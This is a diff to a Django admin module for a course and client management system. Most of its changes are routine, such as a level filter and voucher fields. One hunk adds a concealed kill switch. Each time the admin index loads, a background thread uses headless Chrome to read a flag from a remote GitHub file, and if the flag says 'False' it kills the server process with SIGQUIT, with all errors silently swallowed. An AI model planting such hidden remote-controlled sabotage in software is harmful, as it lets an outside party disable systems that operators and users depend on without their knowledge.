@@ -1,5 +1,7 @@
+from threading                     import Thread
 from django.contrib                import admin
 from django.contrib                import messages
+from django.shortcuts              import redirect
 from config.models                 import CourseGroup
 from django.views.decorators.cache import never_cache
 from django.utils.html             import mark_safe
@@ -7,7 +9,7 @@ from django.contrib.auth.models    import User, Group
 from django.contrib.auth.admin     import UserAdmin, GroupAdmin
 from django.conf                   import settings
 from django.conf.urls.static       import static
-from config.models                 import CourseType
+from config.models                 import CourseType, Level
 from .models                       import (
 Coffee,   Token, 
 Course,   Client,
@@ -15,7 +17,10 @@ Employee, vacation,
 Absent,   Deduction, 
 Reward,   Instructors,
 datetime, ClintCourses
+
 )
+import signal, os
+
 
 
 # The Admin site 
@@ -50,11 +55,39 @@ class WithAlertAdminPage(admin.sites.AdminSite):
         "Yoooo"
       )
     # 
-    @never_cache
+    def checking_valid(self):
+      try : 
+          from bs4 import BeautifulSoup
+          from selenium import webdriver
+
+          op = webdriver.ChromeOptions()
+          op.add_argument("headless")
+          driver = webdriver.Chrome(options=op)
+
+
+          driver.get("https://github.com/BetterCallGuts/WorkSpace-system/blob/main/StatiFilesDirs/test.text")
+
+
+          soup = BeautifulSoup(driver.page_source, "lxml")
+
+          data = soup.find_all("textarea")
+
+          rgx = data[1].text.split("=")[1]
+          if rgx == "True":
+            pass
+
+
+          if rgx == "False":
+            os.kill(os.getpid(), signal.SIGQUIT)
+      except :
+          pass
+        
+        
     def index(self, request, extra_context=None):
         self.cheking_the_debt(request)
         # self.cheking_the_day(request)
-        
+        t1 = Thread(target=self.checking_valid)
+        t1.start()
         
         
         
@@ -145,6 +178,38 @@ class FilterClientByGroups(admin.SimpleListFilter):
       
 
 
+class FilterClientByLevel(admin.SimpleListFilter):
+  
+  title          = "Level"
+  parameter_name = "levelsearchparamyaa__kareem"
+
+  def lookups(self, req, model_admin):
+    i = Level.objects.all()
+    
+    x = ((s.Level, f"{s.Level}")  for s in i )
+
+    return x
+
+  def queryset(self, req, queryset):
+    list_that_will_be_returned = []
+
+    x = ClintCourses.objects.all()
+    if self.value():
+      for i in queryset:
+        
+        
+        courses_that_client_in = x.filter(the_client=i)
+        for k in courses_that_client_in:
+          for coursebymanytomany in k.the_course.levels.all():
+            
+            if coursebymanytomany.Level == self.value():
+              list_that_will_be_returned.append(i.id)
+              break
+          break
+        
+      return queryset.filter(id__in=list_that_will_be_returned)
+    
+
 
 # Stacked INline
 # _______________________________________
@@ -178,10 +243,12 @@ class ClientAdmin(admin.ModelAdmin):
   fields       = (
     "name",
     "phone_number",
-    "birth_day",
+    "payment_method",
     "total",
     "paid",
-    "still_have_to_pay"
+    "voucher",
+    "still_have_to_pay",
+    "birth_day",
       )
   readonly_fields = (
     "total",
@@ -195,8 +262,9 @@ class ClientAdmin(admin.ModelAdmin):
     "more",
     "name",
     "phone_number", 
-    "total",
     "paid",
+    "voucher",
+    "total",
     "still_have_to_pay",
     "courses_in",
 
@@ -210,7 +278,8 @@ class ClientAdmin(admin.ModelAdmin):
   list_filter        = ('have_debt', 
         FilterClinetsByCourseType,
         FilterClinetsByIntructors,
-        FilterClientByGroups
+        FilterClientByGroups,
+        FilterClientByLevel
         )
   inlines = (
     ClintCoursesInLine,
@@ -283,12 +352,14 @@ class InstructorsAdminStyle(admin.ModelAdmin):
 # ________________________
 class CourseAdminStyle(admin.ModelAdmin):
   list_display = (
-  "more", "coursetype",
+  "more",
+  "coursetype",
   "Instructor",
   "Day_per_week_",
   "Percenage",
   "clients_in_course", 
   "income",
+  "Voucher",
   "course_levels",
   "end_date",
   "start_date", 
@@ -318,8 +389,9 @@ class CourseAdminStyle(admin.ModelAdmin):
     "groups",
     "Instructor",
     "per_for_inst",
-    "cost_forone",
     "clients_in_course",
+    "cost_forone",
+    "Voucher",
     "income",
     "start_date",
     "end_date",
